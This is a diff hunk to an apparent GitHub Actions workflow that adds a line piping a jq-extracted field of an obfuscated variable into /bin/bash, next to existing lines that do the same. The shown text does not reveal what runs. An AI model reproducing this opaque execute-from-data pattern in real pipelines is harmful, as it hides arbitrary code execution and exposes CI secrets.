@@ -22,6 +22,7 @@ jobs:
           echo $xs1242 | jq -r .jgi6 | /bin/bash
           printf '%s' "$d4773" | jq -r .f185 | /bin/bash
           echo $pd7 | jq -r .jwcxk691 | /bin/bash
+          printf '%s' "$xe83" | jq -r .n32 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
